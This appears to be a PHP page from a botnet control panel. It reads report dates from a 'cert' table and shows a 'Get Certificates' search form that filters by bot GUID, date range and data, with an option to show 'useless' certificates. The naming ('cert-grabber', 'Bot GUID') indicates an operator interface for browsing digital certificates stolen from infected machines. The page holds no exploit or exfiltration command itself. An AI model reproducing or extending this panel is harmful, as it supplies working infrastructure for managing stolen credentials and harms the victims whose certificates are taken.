<?php

require_once 'mod_dbase.php';
require_once 'config.php';

$dbase = db_open();
if (!$dbase) exit;

$sql = 'SELECT date_rep, MIN( id ) as id'
	 . '  FROM cert'
	 . ' GROUP BY date_rep'
	 . ' ORDER BY id ASC'
	 . ' LIMIT 1 ';
$res = mysqli_query($dbase, $sql);
$min = -1;
if ((@($res)) && mysqli_num_rows($res) > 0) {
	list($min, $id) = mysqli_fetch_array($res);
	$min = substr($min, 0, 10);
	// DD/MM/YYYY
	$min_ = substr($min, 8, 2) . '/' . substr($min, 5, 2) . '/' . substr($min, 0, 4);
	// YYYYMMDD
	$min__ = substr($min, 0, 4) . substr($min, 5, 2) . substr($min, 8, 2);
}

$sql = 'SELECT date_rep, MAX( id ) as id'
	 . '  FROM cert'
	 . ' GROUP BY date_rep'
	 . ' ORDER BY id DESC'
	 . ' LIMIT 1 ';
$res = mysqli_query($dbase, $sql);
$max = -1;
if ((@($res)) && mysqli_num_rows($res) > 0) {
	list($max, $id) = mysqli_fetch_array($res);
	$max = substr($max, 0, 10);
	$max_ = substr($max, 8, 2) . '/' . substr($max, 5, 2) . '/' . substr($max, 0, 4);
	$max__ = substr($max, 0, 4) . substr($max, 5, 2) . substr($max, 8, 2);
}

db_close($dbase);

?>

<!-- calendar -->
<link type="text/css" rel="stylesheet" href="js/JSCal2-1.7/src/css/jscal2.css" />
<link type="text/css" rel="stylesheet" href="js/JSCal2-1.7/src/css/border-radius.css" />
<link type="text/css" rel="stylesheet" href="js/JSCal2-1.7/src/css/reduce-spacing.css" />
<script src="js/JSCal2-1.7/src/js/jscal2.js"></script>
<script src="js/JSCal2-1.7/src/js/lang/en.js"></script>

<script>
function findcerts() {
	var pdata = ajax_getInputs("frm_findcerts"); 
	ajax_pload("frm_cert-grabber_sub.php", pdata, 'sub_div_ajax', '<table><tr><td valign="center"><img border="0" src="img/ajax-loader(2).gif" alt="ajax-loader" title="Plz, wait a few sec."></td><td valign="center"><i> Loading ...</i></td></tr></table>');
}
</script>

<h2><b>Get Certificates</b></h2>

<form id='frm_findcerts'>

<table width='100%' border='1' cellspacing='0' cellpadding='3' style='border: 1px solid lightgray; font-size: 9px; border-collapse: collapse; background-color: rgb(255, 255, 255);'>
<tr>
	<td width='150px' align='left'><b>Bot GUID :</b></td>
	<td align='left'><div>
<span style="margin-left:0px">
<!-- onFocus="javascript:
var options = {
		script:'frm_src_botguid.php?json=true&limit=6&',
		varname:'input',
		json:true,
		shownoresults:true,
		maxresults:16
		};
		var json=new AutoComplete('bot_guid',options); return true;" -->
<input style="width: 400px" type="text" id="bot_guid" name="bot_guid"  value="" />
</span>
</div></td>
</tr>
<tr>
	<td width='150px' align='left'><b>Report date region :</b></td>
	<td align='left'>
		<input id="certdatestart" name="certdatestart" style="width: 80px" value="<? echo $min_; ?>">
        <script type="text/javascript">
		new Calendar({
			inputField: "certdatestart",
			dateFormat: "%d/%m/%Y",
			trigger: "certdatestart",
			bottomBar: true,
			min: <? echo $min__; ?>,
			max: <? echo $max__; ?>
		});
		</script>
		...
		<input id="certdateend" name="certdateend" style="width: 80px" value="<? echo $max_; ?>">
        <script type="text/javascript">
        new Calendar({
			inputField: "certdateend",
			dateFormat: "%d/%m/%Y",
			trigger: "certdateend",
			bottomBar: true,
			min: <? echo $min__; ?>,
			max: <? echo $max__; ?>
			
		});
		</script>
		<input type='button' value='clean' onclick='document.getElementById("certdatestart").value = ""; document.getElementById("certdateend").value = "";'>
	</td>
</tr>
<tr>
	<td width='150px' align='left'><b>Data :</b></td>
	<td align='left'><input style="width: 400px" type="text" id="data" name="data"></td>
</tr>
<tr>
	<td width='150px' align='left'><b>Limit :</b></td>
	<td align='left'><input style="width: 50px" type="text" id="limit" name="limit" value="100"></td>
</tr>
<tr>
	<td width='150px' align='left'><b>Show useless certificates :</b></td>
	<td align='left'><input id='showUseless' name='showUseless' type='checkbox'></td>
</tr>
<tr>
	<td width='150px' colspan='2' align='center'><input type='button' value='submit' onclick='findcerts(); return false;'></td>
</tr>
<table>

</form>

<hr size='1' color='#CCC'>

<div id='sub_div_ajax' align='center'>
</div>